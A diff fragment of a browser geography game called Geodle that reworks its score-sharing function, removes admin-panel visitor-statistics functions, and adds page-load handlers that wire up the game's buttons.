+    `🌍 Geodle - I guessed "${currentQuestion.answer}" in ${cluesUsed}/10 clues! Total Wins: ${totalWins}` :
+    `🌍 Geodle - I couldn't guess "${currentQuestion.answer}" in 10 clues. Can you?`;
   
   if (navigator.share) {
     navigator.share({
-      title: 'Geodle - Geography Game',
-      text: shareText,
+      title: 'Geodle Score',
+      text: scoreText,
       url: window.location.href
     });
   } else {
     // Fallback - copy to clipboard
-    navigator.clipboard.writeText(shareText + ' ' + window.location.href).then(() => {
-      alert('Score copied to clipboard!');
-    }).catch(() => {
-      alert('Share text: ' + shareText);
-    });
+    navigator.clipboard.writeText(scoreText + '\n' + window.location.href);
+    alert('Score copied to clipboard!');
   }
 }
 
-// Admin panel functions
-function showAdminPanel() {
-  document.getElementById('adminPanel').style.display = 'block';
-  if (visitorTracker) {
-    visitorTracker.updateDisplay();
-  }
-}
-
-function hideAdminPanel() {
-  document.getElementById('adminPanel').style.display = 'none';
-}
-
-function syncData() {
-  if (visitorTracker) {
-    visitorTracker.syncFromCloud();
-  }
-}
-
-function exportData() {
-  if (visitorTracker) {
-    visitorTracker.exportData();
-  }
-}
-
-function resetStats() {
-  if (confirm('Are you sure you want to reset all visitor statistics?')) {
-    if (visitorTracker) {
-      visitorTracker.resetStats();
+// Start the game when page loads
+document.addEventListener('DOMContentLoaded', function() {
+  // Add a small delay to ensure data.js is fully loaded
+  setTimeout(() => {
+    initGame();
+  }, 100);
+  
+  // Set up event listeners
+  document.getElementById('guessForm').addEventListener('submit', handleGuess);
+  document.getElementById('resetBtn').addEventListener('click', resetGame);
+  document.getElementById('resetWinsBtn').addEventListener('click', function() {
+    if (confirm('Are you sure you want to reset your win count? This cannot be undone.')) {
+      resetWinCount();
+      updateWinDisplay();
+      showFeedback('🏆 Win count reset to 0!', '#6f42c1');
     }
-  }
-}
+  });
+  document.getElementById('shareBtn').addEventListener('click', shareScore);
+  document.getElementById('newGameBtn').addEventListener('click', initGame);
+});
+</script>
+
+</body>
+</html>
